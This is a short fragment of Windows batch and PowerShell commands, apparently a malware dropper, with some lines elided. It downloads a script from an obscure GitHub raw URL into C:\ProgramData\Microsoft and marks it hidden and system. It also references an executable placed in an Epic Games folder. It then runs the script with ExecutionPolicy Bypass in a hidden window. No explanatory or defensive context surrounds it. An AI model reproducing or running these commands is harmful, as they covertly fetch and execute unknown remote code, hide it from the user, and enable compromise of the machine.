...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\setup.ps1'"
...
attrib +h +s "C:\ProgramData\Microsoft\setup.ps1"

"C:\Program Files (x86)\Epic Games\NetworkAppControl.exe"
powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\setup.ps1"' -WindowStyle Hidden
